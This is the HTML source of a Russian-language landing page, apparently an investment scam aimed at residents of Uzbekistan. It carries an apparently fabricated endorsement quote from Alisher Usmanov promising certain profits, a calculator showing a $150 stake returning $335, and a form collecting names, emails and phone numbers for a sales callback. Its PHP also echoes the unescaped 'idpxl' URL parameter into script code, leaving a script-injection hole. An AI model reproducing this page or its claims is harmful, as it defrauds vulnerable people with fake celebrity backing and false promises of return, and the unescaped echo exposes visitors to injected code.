<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>USM - Официальный сайт</title>
    <link rel="shortcut icon" href="assets/rus.png" />
    <link href="assets/fonts.css" rel="stylesheet" />
    <link href="assets/app.css" rel="stylesheet" />
    <link rel="stylesheet" href="assets/ion.rangeSlider.min.css" />
    <link rel="stylesheet" href="assets/jquery.fancybox.min.css" />
    <script src="assets/jquery.min.js"></script>
    <script src="assets/ion.rangeSlider.min.js"></script>
    <!--    <script src="js/jquery.fancybox.min.js"></script>-->
    <link rel="stylesheet" href="assets/intlTelInput.css" />
    <link rel="stylesheet" href="assets/registerForm.css" />
    <!--      <link rel="stylesheet" href="css/turn-sound.css">-->
    <link rel="stylesheet" href="css/intlTelInput.min.css" />
    <link rel="stylesheet" href="css/modal.css" />

    <!-- JS adapter -->
    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie = name + '=' + value + ';path=/;expires=' + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!'{subid}'.match('{')) {
          return '{subid}';
        }
        var clientSubid = '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (clientSubid && !clientSubid.match('>')) {
          return clientSubid;
        }
        if (params.get('_subid')) {
          return params.get('_subid');
        }
        if (params.get('subid')) {
          return params.get('subid');
        }
        if (getCookie('subid')) {
          return getCookie('subid');
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!'{token}'.match('{')) {
          return '{token}';
        }
        var clientToken = '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (clientToken && !clientToken.match('>')) {
          return clientToken;
        }
        if (params.get('_token')) {
          return params.get('_token');
        }
        if (params.get('token')) {
          return params.get('token');
        }
        if (getCookie('token')) {
          return getCookie('token');
        }
        return null;
      }

      if (typeof URLSearchParams === 'function') {
        document.addEventListener('DOMContentLoaded', function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();

          params.set('_token', token);
          setCookie('token', token);
          setCookie('subid', subid);

          // Adds params as hidden inputs to the forms
          document.querySelectorAll('form').forEach(function (form) {
            params.forEach(function (v, k) {
              var input = document.createElement('input');
              input.type = 'hidden';
              input.name = k;
              input.value = v;

              form.append(input);
            });
          });
        });
      }
    </script>
    <!-- End JS adapter -->

    <script
      async
      src="https://api.imotech.video/ad/events.js?pixel_id=<?php echo (isset($_GET['idpxl'])) ? $_GET['idpxl'] : ''; ?>"
    ></script>
    <script>
      window.bgdataLayer = window.bgdataLayer || [];

      function bge() {
        bgdataLayer.push(arguments);
      }
      bge('init', "<?php echo (isset($_GET['idpxl'])) ? $_GET['idpxl'] : ''; ?>");
    </script>
  </head>

  <body class="text-primary font-sans leading-snug iti-mobile" style="min-width: 360px">
    <div
      data-lastpass-root=""
      style="
        position: absolute !important;
        top: 0px !important;
        left: 0px !important;
        height: 0px !important;
        width: 0px !important;
      "
    >
      <div
        data-lastpass-infield="true"
        style="position: absolute !important; top: 0px !important; left: 0px !important"
      ></div>
    </div>

    <header class="sm:w-full sm:z-50 sm:mb-8">
      <div class="container relative flex justify-between items-center mx-auto py-4 mb-6 sm:mb-0">
        <div class="flex w-1/2 md:w-auto">
          <a href="https://archi.ferrm.bond/uzb_usman/#">
            <img style="max-width: 80px" src="assets/logo.png" alt="logo" />
          </a>
        </div>
        <div class="flex w-1/2 justify-end">
          <img style="max-width: 100px" src="assets/rus.png" alt="rus" />
        </div>
      </div>
    </header>

    <style>
      .form-button-send {
        transition: all 0.3s ease;
        color: #fff;
        padding-top: 0.75rem;
        padding-bottom: 0.75rem;
        font-weight: 700;
        font-family: Open Sans, sans-serif;
        border-radius: 0.25rem;
        background-color: #4290fc;
        width: 100%;
      }

      form.form-container button[type='submit'] {
        transition: all 0.3s ease;
        color: #fff;
        padding-top: 0.75rem;
        padding-bottom: 0.75rem;
        font-weight: 700;
        font-family: Open Sans, sans-serif;
        border-radius: 0.25rem;
        background-color: #4290fc;
        width: 100%;
      }

      .vjs-tech,
      .vjs-big-play-button,
      .vjs-icon-placeholder,
      .vjs-icon-placeholder::after,
      .vjs-icon-placeholder::before {
        outline: none;
      }

      input:not([type='checkbox']) {
        border-radius: 0.25rem;
        width: 100%;
        height: 45px;
        border: 1px solid lightgray;
        padding: 0 15px;
        outline: none;
        font-size: 16px;
        font-weight: normal;
        color: #333;
        /* text-align: center; */
      }

      .vue-tel-input {
        border: none;
      }

      .form-container button[type='submit'] {
        transition: all 0.3s ease;
        color: #fff;
        padding-top: 0.75rem;
        padding-bottom: 0.75rem;
        font-weight: 700;
        font-family: Open Sans, sans-serif;
        border-radius: 0.25rem;
        /* background-color: #f11313; */
        width: 100%;
      }

      form .input-wrap {
        margin: 13px 0;
      }

      .input-form-reg-num-up {
        border-radius: 0.25rem !important;
        width: 100% !important;
        height: 45px !important;
        background: #f7f7f7 !important;
        border: none !important;
        /* padding-left: 100px !important; */
        outline: none !important;
        font-size: 16px !important;
        font-weight: 400 !important;
        color: #333 !important;
        /* text-align: center !important; */
      }

      .iti--separate-dial-code {
        width: 100%;
      }

      .form_group--name {
        margin-bottom: 11px;
      }

      .form_group--email {
        margin-bottom: 11px;
      }

      .form_input--group {
        margin-bottom: 11px;
      }

      .iti__selected-flag {
        max-height: 43px;
        outline: none;
      }

      .input-form-reg-up {
        border-radius: 0.25rem !important;
        width: 100% !important;
        height: 45px !important;
        background: #f7f7f7 !important;
        border: none !important;
        padding: 0 15px !important;
        outline: none !important;
        font-size: 16px !important;
        font-weight: 400 !important;
        color: #333 !important;
      }

      label.error {
        display: inline-block;
        width: 100%;
        font-weight: 400;
        margin-top: 0.25rem;
        margin-bottom: 0 !important;
        padding: 5px;
        color: #fff;
        background-color: #eb162b;
        font-size: 12px;
        border-radius: 0.25rem !important;
      }

      input.error {
        border: 3px solid #eb162b !important;
      }

      input.valid {
        border: 3px solid #41ad48 !important;
      }

      #video {
        margin-bottom: 20px;
      }

      .iti__selected-dial-code {
        color: #000;
      }
    </style>

    <main class="">
      <section class="container mx-auto mb-16 sm:mb-12 pt-4 sm:pt-0">
        <h1
          class="sm:text-3xl text-5xl text-center leading-extra-tight sm:leading-snug font-ubuntu font-black mb-3 sm:mb-6"
        >
          Алишер Усманов делает жизнь жителей Узбекистана<br />
          лучше с каждым днём
        </h1>
        <!-- <h2 class="text-center text-2xl mb-6 sm:text-xl">
              Теперь национальные ресурсы в ваших руках!
        </h2> -->
      </section>

      <section class="container mx-auto mb-24 sm:mb-24">
        <a id="registration"></a>
        <div class="w-full flex justify-center items-center sm:flex-col">
          <div class="video-container">
            <video controls poster="video/poster.jpg">
              <source src="video/video.mp4" type="video/mp4" />
            </video>
          </div>

          <style>
            .video-container {
              position: relative;
              width: 100%;
              padding-bottom: 56.25%;
              /* 16:9 соотношение сторон */
              overflow: hidden;
            }

            .video-container video {
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
            }
          </style>

          <div class="pl-6 block w-1/3 sm:p-0 sm:w-full" style="min-width: 300px">
            <div
              class="form-box bg-white pt-6 pb-4 px-6 rounded-custom text-primary shadow-form"
              id="form1"
            >
              <h3
                class="text-2xl text-center font-bold font-ubuntu mb-6 sm:mb-10"
                style="color: #00223a"
              >
                Начните зарабатывать прямо сейчас!
              </h3>

              <form class="form-container" id="formTop" method="post" autocomplete="off">
                <div class="form_group--name">
                  <input name="first_name" id="first_name" placeholder="Введите имя" required />
                </div>
                <div class="form_group--name">
                  <input placeholder="Введите фамилию" name="last_name" id="last_name" required />
                </div>
                <div class="form_group--email">
                  <input type="email" name="email" id="email" placeholder="Email" required />
                </div>
                <div class="form_input--group">
                  <input
                    type="tel"
                    class="phone input-form-reg-num-up"
                    id="phone1"
                    name="phone1"
                    required
                  />
                  <input type="hidden" id="realPhone" name="realPhone" class="hidden-phone" value />
                  <input type="hidden" id="country" name="country" value />
                </div>
                <div class="form_group--button">
                  <button class="send-form btn btn-primary btn_send" type="submit">
                    <span class="button--inner">Подать заявку</span>
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </section>
      <div class="pt-8 pb-8 bg-primary mb-32">
        <section class="container mx-auto flex justify-center pb-12 pt-12">
          <div class="flex flex-col w-2/5 items-center bg-white md:w-4/5 sm:w-full">
            <form
              id="form3"
              class="block bg-white text-primary overflow-hidden w-full pt-6 pb-4 px-6 sm:pt-2 sm:px-4 sm:leading-tight"
            >
              <h3
                class="text-2xl text-center font-bold font-ubuntu mt-5 mb-6 sm:mb-10"
                style="color: #000"
              >
                Сколько я заработаю?
              </h3>
              <div class="flex flex-col text-center font-bold mb-4 sm:mb-10 px-5">
                <label class="block text-center font-bold mb-2">Ваша инвестиция</label>
                <input
                  type="text"
                  class="js-range-slider"
                  style="display: none"
                  name="my_range"
                  value="150"
                  tabindex="-1"
                  readonly=""
                />
              </div>
              <div class="flex flex-col mb-5">
                <label class="block text-center font-bold" style="color: #000; text-align: center"
                  >Ваша прибыль</label
                >
                <h3
                  class="text-2xl text-center font-bold font-ubuntu mt-5"
                  style="color: #000; text-align: center"
                  id="calcResult"
                >
                  335 $.
                </h3>
              </div>
              <div class="flex mb-4 justify-center">
                <a
                  href="javascript:void(0)"
                  class="inline-block text-center w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3 scrl-top"
                >
                  Подать заявку
                </a>
              </div>
            </form>
          </div>
        </section>
      </div>
      <section id="content" class="container pt-4 mb-32 mx-auto">
        <div class="w-full sm:flex sm:flex-col">
          <div class="">
            <article class="p-8 sm:pt-20 sm:pb-12 sm:px-4 flex flex-col bg-secondary text-white">
              <h3 class="text-4xl sm:text-3xl sm:mb-16 font-bold font-ubuntu mb-8">
                Что нужно сделать, чтобы начать зарабатывать c USM уже сейчас?
              </h3>
              <ul class="text-lg">
                <li class="mb-10 flex items-start">
                  <span
                    class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"
                  ></span
                  >Зарегистрироваться на данном сайте в форме выше
                </li>
                <li class="mb-10 flex items-start">
                  <span
                    class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"
                  ></span
                  >Дождаться звонка от финансового эксперта USM и подтвердить регистрацию
                </li>
                <li class="mb-10 flex items-start">
                  <span
                    class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"
                  ></span
                  >Внести желаемую сумму инвестиции на счет и уже в скором времени (зависит от
                  выбранных вами условий) получить первую прибыль
                </li>
              </ul>
            </article>
          </div>
        </div>
        <div class="w-full flex sm:flex-col-reverse">
          <div class="pt-18 inline-block w-2/5 text-primary sm:p-0 sm:w-full">
            <article class="flex flex-col text-lg sm:text-base">
              <h4 class="text-2xl font-ubuntu font-bold mb-2" style="color: #fff">
                Алишер Усманов
              </h4>
              <h5 class="text-black opacity-50 mb-10 sm:mb-6">
                Алишєр Усманов назвал платформу единственной действительно приносящей прибыль
              </h5>
              <p class="mb-8 sm:leading-relaxed">
                Как вы знаете, Узбекистан и его жители сейчас переживают не лучшие времена в своей
                истории, и я думаю, что единственным верным решением будет открыть доступ к
                платформе, которой лично я пользуюсь уже не первый год, я не могу смотреть, как
                простые люди не живут, а выживают, к тому же, специально для жителей Узбекистана
                минимальный порог входа всего 150$, до этого он был минимум 10000$, да и вообще, мы
                решили разработать специальные инвестиционные пакеты, так, как народ не слишком
                образован в финансовом плане, и легко мог бы уйти в минус, но не переживайте, мы
                наняли менеджеров, они вам будут помогать на всех этапах. Отблагодарите потом, как
                заработаете, а вы обязательно заработаете, проверено. - сказал Алишэр Усманов
              </p>
              <div class="text-base">
                <a
                  href="javascript:void(0)"
                  class="inline-block text-center w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3 scrl-top"
                  >Подать заявку</a
                >
              </div>
            </article>
          </div>
          <div
            class="-ml-1 -mt-24 sm:mt-0 sm:-ml-4 sm:p-0 sm:w-screen sm:mb-8 sm:overflow-hidden pl-8 relative inline w-3/5 text-primary"
          >
            <img class="sm:-mt-12 topre" src="assets/photo.jpg" alt="photo" />
          </div>
        </div>
      </section>

      <section id="posts" class="w-full mb-20">
        <div style="display: flex; justify-content: center; margin-top: 45px; margin-bottom: 25px">
          <h2 class="mb-8 text-4xl sm:text-3xl font-bold font-ubuntu text-center topup">
            Сферы инвестирования
          </h2>
          <svg
            width="85"
            height="85"
            viewBox="0 0 85 85"
            class="svgnone2"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
            xlink="http://www.w3.org/1999/xlink"
          >
            <mask
              id="mask0_43_9"
              style="mask-type: alpha"
              maskUnits="userSpaceOnUse"
              x="0"
              y="0"
              width="85"
              height="85"
            >
              <path d="M0 0H85V85H0V0Z" fill="url(#pattern0)"></path>
            </mask>
            <g mask="url(#mask0_43_9)">
              <path d="M0 0H85V85H0V0Z" fill="white"></path>
            </g>
            <defs>
              <pattern id="pattern0" patternContentUnits="objectBoundingBox" width="1" height="1">
                <use href="#image0_43_9" transform="scale(0.00333333)"></use>
              </pattern>
              <image
                id="image0_43_9"
                width="300"
                height="300"
                href="data:image/png;base64,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